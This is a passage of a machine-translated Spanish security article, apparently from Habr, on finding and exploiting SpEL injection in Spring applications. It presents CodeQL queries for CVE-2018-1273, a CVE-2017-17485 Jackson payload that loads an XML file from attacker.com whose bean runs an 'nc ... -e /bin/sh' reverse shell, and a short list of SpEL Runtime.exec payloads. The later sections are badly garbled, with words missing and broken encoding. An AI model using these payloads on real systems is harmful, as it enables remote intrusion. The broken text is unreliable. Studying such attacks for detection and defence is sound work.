src="https://habrastorage.org/webt/or/cs/bu/orcsbusthzp51u1y_l0wuupohe8.png"></p><br><p>  Entonces, ¬øqu√© se debe hacer para encontrar la vulnerabilidad CVE 2018-1273? <br>  Una vez recibida y conectada la imagen del proyecto, usamos la consola QL para describir el √°rbol de llamadas que nos interesa.  Para hacer esto: <br>  Describimos la clase del analizador de expresiones: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ExpressionParser</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RefType</span></span></span><span class="hljs-class"> </span></span>{ ExpressionParser() { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hasQualifiedName(<span class="hljs-string"><span class="hljs-string">"org.springframework.expression"</span></span>, <span class="hljs-string"><span class="hljs-string">"ExpressionParser"</span></span>) } }</code> </pre> <br><p>  Y los m√©todos que se pueden usar para la ejecuci√≥n dentro de la clase ExpressionParser: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ParseExpression</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ ParseExpression() { exists (Method m | (m.getName().matches(<span class="hljs-string"><span class="hljs-string">"parse%"</span></span>) or m.hasName(<span class="hljs-string"><span class="hljs-string">"doParseExpression"</span></span>)) and <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() = m ) } }</code> </pre> <br><p>  Ahora necesita conectar estas descripciones entre s√≠ y hacer una selecci√≥n: </p><br><pre> <code class="sql hljs">from ParseExpression expr where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr</code> </pre> <br><p>  Dicha consulta devolver√° todos los m√©todos que comienzan con parse o con el nombre doParseExpression que pertenecer√° a la clase ExpressionParser.  Pero eso es demasiado, dices, y tendr√°s raz√≥n.  Se requiere un filtro. </p><br><p>  Porque  en el c√≥digo hay un comentario de la forma: </p><br><pre> <code class="sql hljs">* Converts a patch path to an {@link Expression}. * * @param path the patch path to convert.</code> </pre> <br><p>  Eso podr√≠a ser, por ejemplo, una b√∫squeda de "ruta" en Javadoc.  Spring comenta su c√≥digo en una calidad muy alta, y podemos encontrar llamadas a m√©todos con el comentario necesario y, al mismo tiempo, eliminar todos los m√©todos que se incluyen en las pruebas.  Todo esto se puede describir de la siguiente manera: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">CallHasPath</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Callable</span></span></span><span class="hljs-class"> </span></span>{ CallHasPath() { not <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getDeclaringType() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> TestClass </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">and</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getDoc()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath or </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDeclaringType</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath ) } }</span></span></code> </pre> <br><p>  Luego, para combinar la clase, los m√©todos y el filtro por Javadoc, la consulta para la selecci√≥n tomar√° la siguiente forma: </p><br><pre> <code class="sql hljs">from ParseExpression expr, CallHasPath c where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser and c = expr.getEnclosingCallable()) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr, c</code> </pre> <br><p>  Este ejemplo puede considerarse simple y, en general, redundante para buscar una vulnerabilidad espec√≠fica.  Mucho m√°s interesante es la b√∫squeda de errores al escribir una soluci√≥n, porque  en √©l, debe especificar la clase en s√≠, que es responsable de la verificaci√≥n, los m√©todos que siempre la llaman y que se ejecutan antes de ser verificados. </p><br><p>  Una llamada a un m√©todo que siempre llama a generatePath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">VerifyPathCallerAccess</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ VerifyPathCallerAccess() { exists(VerifyPathActionConf conf | conf.callAlwaysPerformsAction(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>) ) or <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> VerifyPath } }</code> </pre> <br><p>  Una llamada a un m√©todo que se ejecuta antes de verificarPath: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UnsafeEvaluateCall</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ UnsafeEvaluateCall() { ( <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> Evaluate or </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(UnsafeEvaluateCall unsafe | </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getMethod()</span></span></span><span class="hljs-function"> </span></span>= unsafe.getEnclosingCallable() ) ) <span class="hljs-function"><span class="hljs-function">and not </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(VerifyPathCallerAccess verify | dominates(verify, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> ) } }</span></span></code> </pre> <br><p>  Considere otra vulnerabilidad interesante.  Su comprensi√≥n es muy importante, porque  muestra que el error puede estar en una biblioteca de terceros y demuestra c√≥mo se pueden usar beans anotados en XML. </p><br><h2 id="jackson-and-bean">  Jackson y frijol </h2><br><p>  CVE-2017-17485 se basa en el uso de FileSystemXmlApplicationContext: es un contexto de aplicaci√≥n independiente en forma de XML, que recibe archivos de definici√≥n de contexto del sistema de archivos o de la URL. </p><br><p>  Seg√∫n la documentaci√≥n, esto le permite cargar beans desde un archivo y volver a cargar el contexto de la aplicaci√≥n. <br>  "... Cree un nuevo FileSystemXmlApplicationContext, cargando las definiciones de los archivos XML dados y actualizando autom√°ticamente el contexto" </p><br><p>  Jackson es una biblioteca que le permite serializar y deserializar cualquier objeto, excepto aquellos en la lista negra.  Los atacantes suelen utilizar esta oportunidad.  En el caso de esta vulnerabilidad, el atacante tuvo que pasar el objeto <code>org.springframework.context.support.FileSystemXmlApplicationContext</code> con un valor que contiene la ruta al archivo controlado por el atacante. </p><br><p>  Es decir  en el cuerpo de la solicitud, puede pasar el siguiente JSON: </p><br><pre> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-attr"><span class="hljs-attr">"obj"</span></span>: [<span class="hljs-string"><span class="hljs-string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span></span>, <span class="hljs-string"><span class="hljs-string">"https://attacker.com/spel.xml"</span></span>]}</code> </pre> <br><p>  Spel.xml contendr√° par√°metros bin: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pb"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.ProcessBuilder"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value-type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.String"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>nc<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>XXXX<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>9999<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>-e<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>/bin/sh<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"whatever"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{pb.start()}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Porque  Dado que usamos la clase de bean java.lang.ProcessBuilder, que tiene un m√©todo de inicio, despu√©s de volver a cargar el contexto, Spring lee la expresi√≥n que inicia ProcessBuilder desde la propiedad SpEL, lo que obliga al servidor a conectarse a nosotros usando nc. </p><br><p>  Vale la pena prestar atenci√≥n al spel.xml dado como ejemplo, como  muestra c√≥mo pasar par√°metros al ejecutar el comando. </p><br><p>  ¬øY de qu√© otra manera podemos cargar nuestro bean o recargar el contexto? </p><br><p>  Incluso con un vistazo r√°pido a la documentaci√≥n de Spring, puede encontrar algunas clases m√°s que pueden sernos √∫tiles. </p><br><p>  ClassPathXmlApplicationContext y AbstractXmlApplicationContext son similares a FileSystem, pero los beans con anotaciones de ClassPath y XML se utilizan como la ruta a la configuraci√≥n, respectivamente. </p><br><p>  Hay otro punto interesante relacionado con la recarga del contexto: @RefreshScope. </p><br><p>  Cualquier Spring Bean anotado con @RefreshScope se actualizar√° en el momento del lanzamiento.  Y todos los componentes que lo usan recibir√°n un nuevo objeto la pr√≥xima vez que se llame al m√©todo, se inicializar√°n completamente y se introducir√°n dependiendo. </p><br><p>  RefreshScope es un componente en contexto, y tiene un m√©todo p√∫blico Actualizar todo dise√±ado para actualizar todos los componentes en un √°rea al borrar el cach√© de destino.  Por lo tanto, cuando se utiliza @RefreshScope, el usuario puede acceder a una URL que termina en / refresh y, por lo tanto, volver a cargar los beans anotados. </p><br><h2 id="drugie-utility">  Otras utilidades </h2><br><p>  Hay muchos otros complementos y programas que le permiten analizar el c√≥digo y encontrar la vulnerabilidad. </p><br><ul><li>  Jprofiler: se instala como una aplicaci√≥n separada: servidor y complemento para IDE.  Le permite analizar una aplicaci√≥n en ejecuci√≥n.  Es muy conveniente analizar el comportamiento de los objetos mediante gr√°ficos. </li></ul><br><p><img src="https://habrastorage.org/webt/g4/ki/ij/g4kiijoeylzhjo742es00a_ksti.png"></p><br><p>  De los menos - pagados, pero tiene un per√≠odo libre de 10 d√≠as.  Se considera una de las mejores utilidades para analizar el comportamiento de las aplicaciones, no solo desde el punto de vista de la seguridad. </p><br><ul><li>  Xrebel - pagado, no encontramos la posibilidad de un per√≠odo de prueba.  Pero tambi√©n considerado uno de los mejores. </li><li>  Coverity: utiliza sus propios servidores para el an√°lisis, por lo tanto, es conveniente solo para aquellos que no tienen miedo de dise√±ar su c√≥digo. </li><li>  Checkmarx: muy famoso, pagado, conoce muchos idiomas y arroja muchos falsos positivos.  Pero es mejor se√±alar el lugar donde la teor√≠a puede tener un error que perder un error real. </li><li>  Verificaci√≥n de dependencia de OWASP: se proporciona como un complemento conveniente para varios constructores.  Logramos probarlo para Maven y Ant cuando analizamos una aplicaci√≥n Java.  Tambi√©n es compatible con .Net.  Seg√∫n los resultados del trabajo, proporciona un informe conveniente que indica bibliotecas obsoletas y vulnerabilidades conocidas por ellos. </li><li>  Findbugs: ya se mencion√≥ anteriormente.  Tiene muchas implementaciones, pero la opci√≥n findbugs_cli result√≥ ser la m√°s conveniente y, por alguna raz√≥n, mostr√≥ m√°s problemas.  Se puede usar de la siguiente manera: <br><pre> <code class="bash hljs">findsecbugs.bat -progress -html -output report_name.htm <span class="hljs-string"><span class="hljs-string">"path\example.jar"</span></span></code> </pre> </li><li>  LGTM QL: ya se ha dado un ejemplo de su uso anteriormente.  Nos gustar√≠a decir por separado que tambi√©n hay un caso de uso pago, despu√©s del cual recibir√° un servidor local para analizar su c√≥digo. <br> QL    Java,             . </li></ul><br><h1 id="black-box"> Black Box </h1><br><p>  -,   . <br>  ,    : Spring,     SpEL, ,  SpEL API,   -,        . </p><br><p>         spring,      URL,    API.        /metrics  /beans ‚Äî     Spring Boot Actuator     ,        . </p><br><p>  ,    . </p><br><p>    , SpEL      ,     ,    . </p><br><ul><li>  : <code>var[SpEL]=123</code> </li><li>  : <code>&amp;variable1=123&amp;SpEL=</code> </li><li> : org.springframework.cookie = <code>${}</code> </li><li>     .. </li></ul><br><h2 id="vot-nebolshaya-podborka-s-variantami-peylodov">      : </h2><br><pre> <code class="javascript hljs">${<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-number"><span class="hljs-number">3</span></span>} T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">"nslookup !url!"</span></span>) #<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getClass().forName(<span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span>).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> java.lang.ProcessBuilder({<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>}).start() ${user.name}</code> </pre> <br><h1 id="ne-spelom-ediny">  SpEL  </h1><br><p>    SpEL    ,   ,     EL Injection.    : OGNL, MVEL, JBoss EL, JSP EL.   -        . </p><br><h1 id="v-kachestve-zaklyucheniya">    </h1><br><p>  ZeroNights  : ‚Äú ,  Spring,   SpEL injection?‚Äù </p><br><p>   ,    CVE,   .       ,     ,   github. </p><br><p>  ,   ,            SpEL Expression.  Es decir  (,   )        ,      . </p><br><p>  Es decir            .      ,          ,       ‚Äú‚Äù . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es433034/">https://habr.com/ru/post/es433034/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es433014/index.html">Chistes sobre el reciente lanzamiento de astronautas al espacio exterior</a></li>
<li><a href="../es433016/index.html">Cambios en la interfaz, animaci√≥n en capas y caos visual estructurado: una revisi√≥n de las tendencias web para 2019</a></li>
<li><a href="../es433018/index.html">UDB Que es esto Parte 2. Ruta de datos</a></li>
<li><a href="../es433030/index.html">Live: rendimiento front-end</a></li>
<li><a href="../es433032/index.html">C√≥mo funciona el enrutamiento m√©dico: contamos el ejemplo de la aplicaci√≥n DOC +</a></li>
<li><a href="../es433036/index.html">Consejos para organizar TI en una peque√±a empresa</a></li>
<li><a href="../es433038/index.html">¬øPor qu√© los especialistas en marketing aprenden programaci√≥n?</a></li>
<li><a href="../es433042/index.html">Intel lanzar√° el procesador con arquitectura tridimensional Foveros en 2019</a></li>
<li><a href="../es433044/index.html">El c√≥digo fuente de OpenJDK contiene demasiadas palabras malas</a></li>
<li><a href="../es433046/index.html">Toda la verdad sobre RTOS. Art√≠culo # 25. Canales de datos: introducci√≥n y servicios b√°sicos</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>